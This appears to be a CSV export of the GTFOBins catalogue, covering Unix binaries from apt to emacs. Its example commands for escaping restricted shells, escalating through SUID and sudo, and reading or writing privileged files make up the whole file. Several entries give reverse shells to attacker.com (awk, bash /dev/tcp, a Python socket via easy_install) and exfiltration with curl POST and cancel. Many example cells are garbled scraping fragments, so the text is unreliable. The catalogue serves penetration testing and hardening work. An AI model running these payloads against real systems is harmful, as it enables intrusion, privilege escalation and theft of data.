Binary Name,URL,Description,Functions,Examples
apt,https://gtfobins.github.io/gtfobins/apt/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,"less; apt changelog apt
!/bin/sh; sudo"
ar,https://gtfobins.github.io/gtfobins/ar/,The file appears amid the binary content of the archive.,File read; SUID; Sudo,"TF=$(mktemp -u)
LFILE=file_to_read
ar r ""$TF"" ""$LFILE""
cat ""$TF""; sh -p; -p"
aria2c,https://gtfobins.github.io/gtfobins/aria2c/,Note that the subprocess is immediately sent to the background.,Command; File download; Sudo; Limited SUID,"COMMAND='id'
TF=$(mktemp)
echo ""$COMMAND"" > $TF
chmod +x $TF
aria2c --on-download-error=$TF http://x; aaaaaaaaaaaaaaaa; --allow-overwrite"
arj,https://gtfobins.github.io/gtfobins/arj/,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",File write; File read; SUID; Sudo,"TF=$(mktemp -d)
LFILE=file_to_write
LDIR=where_to_write
echo DATA >""$TF/$LFILE""
arj a ""$TF/a"" ""$TF/$LFILE""
arj e ""$TF/a"" $LDIR; TF=$(mktemp -u)
LFILE=file_to_read
arj a ""$TF"" ""$LFILE""
arj p ""$TF""; sh -p"
arp,https://gtfobins.github.io/gtfobins/arp/,The read file content is corrupted by error prints.,File read; SUID; Sudo,"LFILE=file_to_read
arp -v -f ""$LFILE""; sh -p; -p"
as,https://gtfobins.github.io/gtfobins/as/,"The file content is treated as command line options and disclosed throught error messages, so this is not suitable to read arbitrary binary data.",File read; SUID; Sudo,"LFILE=file_to_read
as @$LFILE; sh -p; -p"
ascii-xfr,https://gtfobins.github.io/gtfobins/ascii-xfr/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
ascii-xfr -ns ""$LFILE""; sh -p; -p"
ascii85,https://gtfobins.github.io/gtfobins/ascii85/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; Sudo,"LFILE=file_to_read
ascii85 ""$LFILE"" | ascii85 --decode; sudo; LFILE=file_to_read
sudo ascii85 ""$LFILE"" | ascii85 --decode"
ash,https://gtfobins.github.io/gtfobins/ash/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; SUID; Sudo,"ash; export LFILE=file_to_write
ash -c 'echo DATA > $LFILE'; sh -p"
aspell,https://gtfobins.github.io/gtfobins/aspell/,The textual file is displayed in an interactive TUI showing only the parts that contain mispelled words.,File read; SUID; Sudo,"LFILE=file_to_read
aspell -c ""$LFILE""; sh -p; -p"
at,https://gtfobins.github.io/gtfobins/at/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Command; Sudo,"echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | at now; tail -f /dev/null; COMMAND=id
echo ""$COMMAND"" | at now; sudo"
atobm,https://gtfobins.github.io/gtfobins/atobm/,"Outputs the first line of the file to standard error without the - and # characters, this can be customized with the -c option, by default is -c -#.",File read; SUID; Sudo,-; #; -c
awk,https://gtfobins.github.io/gtfobins/awk/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Non-interactive reverse shell; Non-interactive bind shell; File write; File read; SUID; Sudo; Limited SUID,"awk 'BEGIN {system(""/bin/sh"")}'; nc -l -p 12345; RHOST=attacker.com
RPORT=12345
awk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
    s = ""/inet/tcp/0/"" RHOST ""/"" RPORT;
    while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
aws,https://gtfobins.github.io/gtfobins/aws/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,"less; aws help
!/bin/sh; sudo"
base32,https://gtfobins.github.io/gtfobins/base32/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
base32 ""$LFILE"" | base32 --decode; sh -p; -p"
base58,https://gtfobins.github.io/gtfobins/base58/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; Sudo,"LFILE=file_to_read
base58 ""$LFILE"" | base58 --decode; sudo; LFILE=file_to_read
sudo base58 ""$LFILE"" | base58 --decode"
base64,https://gtfobins.github.io/gtfobins/base64/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
base64 ""$LFILE"" | base64 --decode; sh -p; -p"
basenc,https://gtfobins.github.io/gtfobins/basenc/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
basenc --base64 $LFILE | basenc -d --base64; sh -p; -p"
basez,https://gtfobins.github.io/gtfobins/basez/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
basez ""$LFILE"" | basez --decode; sh -p; -p"
bash,https://gtfobins.github.io/gtfobins/bash/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; File upload; File download; File write; File read; Library load; SUID; Sudo,"bash; nc -l -p 12345; export RHOST=attacker.com
export RPORT=12345
bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'"
batcat,https://gtfobins.github.io/gtfobins/batcat/,"This invokes the default pager, which is likely to be less, other functions may apply. --paging always can be omitted provided that the output doesn’t fit the screen.",Shell; Sudo; Limited SUID,"less; --paging always; batcat --paging always /etc/profile
!/bin/sh"
bc,https://gtfobins.github.io/gtfobins/bc/,"The file content is actually parsed and appears as error messages, thus it might not be suitable to read arbitray binary files.",File read; SUID; Sudo,"LFILE=file_to_read
bc -s $LFILE
quit; sh -p; -p"
bconsole,https://gtfobins.github.io/gtfobins/bconsole/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; Sudo,"bconsole
@exec /bin/sh; bconsole -c /etc/shadow; sudo"
bpftrace,https://gtfobins.github.io/gtfobins/bpftrace/,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",Sudo,"sudo; sudo bpftrace -e 'BEGIN {system(""/bin/sh"");exit()}'; TF=$(mktemp)
echo 'BEGIN {system(""/bin/sh"");exit()}' >$TF
sudo bpftrace $TF"
bridge,https://gtfobins.github.io/gtfobins/bridge/,Outputs the first line of the file (until the first whitespace) inside an error message to stdandard error.,File read; SUID; Sudo,"LFILE=file_to_read
bridge -b ""$LFILE""; sh -p; -p"
bundle,https://gtfobins.github.io/gtfobins/bundle/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,"less; bundle help
!/bin/sh; export BUNDLE_GEMFILE=x
bundle exec /bin/sh"
bundler,https://gtfobins.github.io/gtfobins/bundler/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,"less; bundler help
!/bin/sh; export BUNDLE_GEMFILE=x
bundler exec /bin/sh"
busctl,https://gtfobins.github.io/gtfobins/busctl/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,"less; busctl --show-machine
!/bin/sh; busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'"
busybox,https://gtfobins.github.io/gtfobins/busybox/,"BusyBox may contain many UNIX utilities, run busybox --list-full to check what GTFOBins binaries are supported. Here some example.",Shell; Reverse shell; File upload; File write; File read; SUID; Sudo,busybox --list-full; busybox sh; nc -lvp 12345
byebug,https://gtfobins.github.io/gtfobins/byebug/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,"TF=$(mktemp)
echo 'system(""/bin/sh"")' > $TF
byebug $TF
continue; sudo; TF=$(mktemp)
echo 'system(""/bin/sh"")' > $TF
sudo byebug $TF
continue"
bzip2,https://gtfobins.github.io/gtfobins/bzip2/,"There are also a number of other utilities that rely on bzip2 under the hood, e.g., bzless, bzcat, bunzip2, etc. Besides having similar features, they also allow privileged reads if bzip2 itself is SUID.",File read; SUID; Sudo,bzip2; bzless; bzcat
c89,https://gtfobins.github.io/gtfobins/c89/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; Sudo,"c89 -wrapper /bin/sh,-s .; LFILE=file_to_delete
c89 -xc /dev/null -o $LFILE; LFILE=file_to_read
c89 -x c -E ""$LFILE"""
c99,https://gtfobins.github.io/gtfobins/c99/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; Sudo,"c99 -wrapper /bin/sh,-s .; LFILE=file_to_delete
c99 -xc /dev/null -o $LFILE; LFILE=file_to_read
c99 -x c -E ""$LFILE"""
cabal,https://gtfobins.github.io/gtfobins/cabal/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,cabal exec -- /bin/sh; sh -p; -p
cancel,https://gtfobins.github.io/gtfobins/cancel/,It can exfiltrate files on the network.,File upload,"nc -l -p 12345 > ""file_to_save""; RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
cancel -u ""$(cat $LFILE)"" -h $RHOST:$RPORT"
capsh,https://gtfobins.github.io/gtfobins/capsh/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,capsh --; sh -p; -p
cat,https://gtfobins.github.io/gtfobins/cat/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
cat ""$LFILE""; sh -p; -p"
cdist,https://gtfobins.github.io/gtfobins/cdist/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,cdist shell -s /bin/sh; sudo; sudo cdist shell -s /bin/sh
certbot,https://gtfobins.github.io/gtfobins/certbot/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,"TF=$(mktemp -d)
certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'; sudo; TF=$(mktemp -d)
sudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'"
check_by_ssh,https://gtfobins.github.io/gtfobins/check_by_ssh/,"This is the check_by_ssh Nagios plugin, available e.g. in /usr/lib/nagios/plugins/.",Shell; Sudo,check_by_ssh; /usr/lib/nagios/plugins/; 2.4.5
check_cups,https://gtfobins.github.io/gtfobins/check_cups/,"This is the check_cups Nagios plugin, available e.g. in /usr/lib/nagios/plugins/. The read file content is limited to the first line.",File read; Sudo,"check_cups; /usr/lib/nagios/plugins/; LFILE=file_to_read
check_cups --extra-opts=@$LFILE"
check_log,https://gtfobins.github.io/gtfobins/check_log/,"This is the check_log Nagios plugin, available e.g. in /usr/lib/nagios/plugins/.",File write; File read; Sudo,"check_log; /usr/lib/nagios/plugins/; LFILE=file_to_write
INPUT=input_file
check_log -F $INPUT -O $LFILE"
check_memory,https://gtfobins.github.io/gtfobins/check_memory/,"This is the check_memory Nagios plugin, available e.g. in /usr/lib/nagios/plugins/. The read file content is limited to the first line.",File read; Sudo,"check_memory; /usr/lib/nagios/plugins/; LFILE=file_to_read
check_memory --extra-opts=@$LFILE"
check_raid,https://gtfobins.github.io/gtfobins/check_raid/,"This is the check_raid Nagios plugin, available e.g. in /usr/lib/nagios/plugins/. The read file content is limited to the first line.",File read; Sudo,"check_raid; /usr/lib/nagios/plugins/; LFILE=file_to_read
check_raid --extra-opts=@$LFILE"
check_ssl_cert,https://gtfobins.github.io/gtfobins/check_ssl_cert/,"This is the check_by_ssh Nagios plugin, available e.g. in /usr/lib/nagios/plugins/.",Command; Sudo,"check_by_ssh; /usr/lib/nagios/plugins/; COMMAND=id
OUTPUT=output_file
TF=$(mktemp)
echo ""$COMMAND | tee $OUTPUT"" > $TF
chmod +x $TF
check_ssl_cert --curl-bin $TF -H example.net
cat $OUTPUT"
check_statusfile,https://gtfobins.github.io/gtfobins/check_statusfile/,"This is the check_statusfile Nagios plugi plugin, available e.g. in /usr/lib/nagios/plugins/. The read file content is limited to the first line.",File read; Sudo,"check_statusfile; /usr/lib/nagios/plugins/; LFILE=file_to_read
check_statusfile $LFILE"
chmod,https://gtfobins.github.io/gtfobins/chmod/,"This can be run with elevated privileges to change permissions (6 denotes the SUID bits) and then read, write, or execute a file.",SUID; Sudo,6; sh -p; -p
choom,https://gtfobins.github.io/gtfobins/choom/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,choom -n 0 /bin/sh; sh -p; -p
chown,https://gtfobins.github.io/gtfobins/chown/,"This can be run with elevated privileges to change ownership and then read, write, or execute a file.",SUID; Sudo,sh -p; -p; sh
chroot,https://gtfobins.github.io/gtfobins/chroot/,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",SUID; Sudo,sh -p; -p; sh
clamscan,https://gtfobins.github.io/gtfobins/clamscan/,"Each line of the file is interpreted as a path and the content is leaked via error messages, thus this might not be suitable to read binary files. The output can optionally be cleaned using sed.",File read; SUID; Sudo,"sed; LFILE=file_to_read
TF=$(mktemp -d)
touch $TF/empty.yara
clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'; sh -p"
cmp,https://gtfobins.github.io/gtfobins/cmp/,"Dump the bytes of the input file that are different from the NUL byte in a tabular format, hence this may not be suitable to read arbitrary binary files.",File read; SUID; Sudo,"LFILE=file_to_read
cmp $LFILE /dev/zero -b -l; sh -p; -p"
cobc,https://gtfobins.github.io/gtfobins/cobc/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,"TF=$(mktemp -d)
echo 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x
cobc -xFj --frelax-syntax-checks $TF/x; sudo; TF=$(mktemp -d)
echo 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x
sudo cobc -xFj --frelax-syntax-checks $TF/x"
column,https://gtfobins.github.io/gtfobins/column/,column expects textual data.,File read; SUID; Sudo,"column; LFILE=file_to_read
column $LFILE; sh -p"
comm,https://gtfobins.github.io/gtfobins/comm/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
comm $LFILE /dev/null 2>/dev/null; sh -p; -p"
composer,https://gtfobins.github.io/gtfobins/composer/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,"TF=$(mktemp -d)
echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json
composer --working-dir=$TF run-script x; sudo; TF=$(mktemp -d)
echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json
sudo composer --working-dir=$TF run-script x"
cowsay,https://gtfobins.github.io/gtfobins/cowsay/,"It allows to execute perl code, other functions may apply.",Shell; Sudo,"perl; TF=$(mktemp)
echo 'exec ""/bin/sh"";' >$TF
cowsay -f $TF x; sudo"
cowthink,https://gtfobins.github.io/gtfobins/cowthink/,"It allows to execute perl code, other functions may apply.",Shell; Sudo,"perl; TF=$(mktemp)
echo 'exec ""/bin/sh"";' >$TF
cowthink -f $TF x; sudo"
cp,https://gtfobins.github.io/gtfobins/cp/,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",File write; File read; SUID; Sudo,"LFILE=file_to_write
echo ""DATA"" | cp /dev/stdin ""$LFILE""; LFILE=file_to_read
cp ""$LFILE"" /dev/stdout; sh -p"
cpan,https://gtfobins.github.io/gtfobins/cpan/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; File upload; File download; Sudo,"cpan; ! command; cpan
! exec '/bin/bash'"
cpio,https://gtfobins.github.io/gtfobins/cpio/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; SUID; Sudo,"echo '/bin/sh </dev/tty >/dev/tty' >localhost
cpio -o --rsh-command /bin/sh -F localhost:; $LFILE; $LDIR"
cpulimit,https://gtfobins.github.io/gtfobins/cpulimit/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,cpulimit -l 100 -f /bin/sh; sh -p; -p
crash,https://gtfobins.github.io/gtfobins/crash/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Command; Sudo,"less; crash -h
!sh; COMMAND='/usr/bin/id'
CRASHPAGER=""$COMMAND"" crash -h"
crontab,https://gtfobins.github.io/gtfobins/crontab/,It can be used to break out from restricted environments by running non-interactive system commands.,Command; Sudo,crontab; crontab -e; sudo
csh,https://gtfobins.github.io/gtfobins/csh/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; SUID; Sudo,"csh; export LFILE=file_to_write
ash -c 'echo DATA > $LFILE'; sh -p"
csplit,https://gtfobins.github.io/gtfobins/csplit/,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",File write; File read; SUID; Sudo,xx0file_to_write; -f; xx
csvtool,https://gtfobins.github.io/gtfobins/csvtool/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; SUID; Sudo,"csvtool call '/bin/sh;false' /etc/passwd; LFILE=file_to_write
TF=$(mktemp)
echo DATA > $TF
csvtool trim t $TF -o $LFILE; LFILE=file_to_read
csvtool trim t $LFILE"
cupsfilter,https://gtfobins.github.io/gtfobins/cupsfilter/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
cupsfilter -i application/octet-stream -m application/octet-stream $LFILE; sh -p; -p"
curl,https://gtfobins.github.io/gtfobins/curl/,It can exfiltrate files on the network.,File upload; File download; File write; File read; SUID; Sudo,"@; URL=http://attacker.com/
LFILE=file_to_send
curl -X POST -d ""@$LFILE"" $URL; URL=http://attacker.com/file_to_get
LFILE=file_to_save
curl $URL -o $LFILE"
cut,https://gtfobins.github.io/gtfobins/cut/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
cut -d """" -f1 ""$LFILE""; sh -p; -p"
dash,https://gtfobins.github.io/gtfobins/dash/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; SUID; Sudo,"dash; export LFILE=file_to_write
dash -c 'echo DATA > $LFILE'; sh -p"
date,https://gtfobins.github.io/gtfobins/date/,"Each line is corrupted by a prefix string and wrapped inside quotes, so this may not be suitable for binary files.",File read; SUID; Sudo,"date; LFILE=file_to_read
date -f $LFILE; sh -p"
dc,https://gtfobins.github.io/gtfobins/dc/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,dc -e '!/bin/sh'; sudo; sudo dc -e '!/bin/sh'
dd,https://gtfobins.github.io/gtfobins/dd/,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",File write; File read; SUID; Sudo,"LFILE=file_to_write
echo ""DATA"" | dd of=$LFILE; LFILE=file_to_read
dd if=$LFILE; sh -p"
debugfs,https://gtfobins.github.io/gtfobins/debugfs/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,"debugfs
!/bin/sh; sh -p; -p"
dialog,https://gtfobins.github.io/gtfobins/dialog/,"The file is shown in an interactive TUI dialog, thus it is not suitable for binary/too big data.",File read; SUID; Sudo,"LFILE=file_to_read
dialog --textbox ""$LFILE"" 0 0; sh -p; -p"
diff,https://gtfobins.github.io/gtfobins/diff/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
diff --line-format=%L /dev/null $LFILE; $TF; LFOLDER=folder_to_list
TF=$(mktemp -d)
diff --recursive $TF $LFOLDER"
dig,https://gtfobins.github.io/gtfobins/dig/,"Each input line is treated as a lookup query for the dig command and the output is corrupted with the result or errors of the operation, so this may not be suitable for binary files. Grepping for DiG might help to filter out unwanted content.",File read; SUID; Sudo,"dig; DiG; LFILE=file_to_read
dig -f $LFILE"
distcc,https://gtfobins.github.io/gtfobins/distcc/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,distcc /bin/sh; sh -p; -p
dmesg,https://gtfobins.github.io/gtfobins/dmesg/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; Sudo,"less; dmesg -H
!/bin/sh; LFILE=file_to_read
dmesg -rF ""$LFILE"""
dmidecode,https://gtfobins.github.io/gtfobins/dmidecode/,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",Sudo,sudo; --dump-bin; --no-sysfs
dmsetup,https://gtfobins.github.io/gtfobins/dmsetup/,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",SUID; Sudo,sh -p; -p; sh
dnf,https://gtfobins.github.io/gtfobins/dnf/,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",Sudo,"sudo; TF=$(mktemp -d)
echo 'id' > $TF/x.sh
fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF; sudo dnf install -y x-1.0-1.noarch.rpm"
docker,https://gtfobins.github.io/gtfobins/docker/,"This requires the user to be privileged enough to run docker, i.e. being in the docker group or being root.",Shell; File write; File read; SUID; Sudo,docker; root; debian
dos2unix,https://gtfobins.github.io/gtfobins/dos2unix/,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",File write,"LFILE1=file_to_read
LFILE2=file_to_write
dos2unix -f -n ""$LFILE1"" ""$LFILE2"""
dosbox,https://gtfobins.github.io/gtfobins/dosbox/,"Basically dosbox allows to mount the local file system, so that it can be altered using DOS commands. Note that the DOS filename convention (8.3) is used.",File write; File read; SUID; Sudo,dosbox; FILE_TO_; echo
dotnet,https://gtfobins.github.io/gtfobins/dotnet/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; Sudo,"dotnet fsi
System.Diagnostics.Process.Start(""/bin/sh"").WaitForExit();;; export LFILE=file_to_read
dotnet fsi
System.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable(""LFILE""));;; sudo"
dpkg,https://gtfobins.github.io/gtfobins/dpkg/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,"less; dpkg -l
!/bin/sh; sudo"
dstat,https://gtfobins.github.io/gtfobins/dstat/,dstat allows you to run arbitrary python scripts loaded as “external plugins” if they are located in one of the directories stated in the dstat man page under “FILES”:,Shell; Sudo,dstat; python; ~/.dstat/
dvips,https://gtfobins.github.io/gtfobins/dvips/,The texput.dvi output file produced by tex can be created offline and uploaded to the target.,Shell; Sudo; Limited SUID,"texput.dvi; tex; tex '\special{psfile=""`/bin/sh 1>&0""}\end'
dvips -R0 texput.dvi"
easy_install,https://gtfobins.github.io/gtfobins/easy_install/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; File upload; File download; File write; File read; Library load; Sudo,"TF=$(mktemp -d)
echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py
easy_install $TF; socat file:`tty`,raw,echo=0 tcp-listen:12345; export RHOST=attacker.com
export RPORT=12345
TF=$(mktemp -d)
echo 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")' > $TF/setup.py
easy_install $TF"
eb,https://gtfobins.github.io/gtfobins/eb/,"This invokes the default logging service, which is likely to be journalctl, other functions may apply. For this to work the target must be connected to AWS instance via EB-CLI.",Shell; Sudo,"journalctl; eb logs
!/bin/sh; sudo"
ed,https://gtfobins.github.io/gtfobins/ed/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; SUID; Sudo; Limited SUID,"ed
!/bin/sh; ed file_to_write
a
DATA
.
w
q; ed file_to_read
,p
q"
efax,https://gtfobins.github.io/gtfobins/efax/,"The content is actually parsed by the command, thus it may not be suitable for reading arbitrary files.",SUID; Sudo,sh -p; -p; sh
elvish,https://gtfobins.github.io/gtfobins/elvish/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; SUID; Sudo,"elvish; export LFILE=file_to_write
elvish -c 'echo DATA >$E:LFILE'; export LFILE=file_to_read
elvish -c 'echo (slurp <$E:LFILE)'"
emacs,https://gtfobins.github.io/gtfobins/emacs/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; SUID; Sudo,"emacs -Q -nw --eval '(term ""/bin/sh"")'; emacs file_to_write
DATA
C-x C-s; emacs file_to_read"
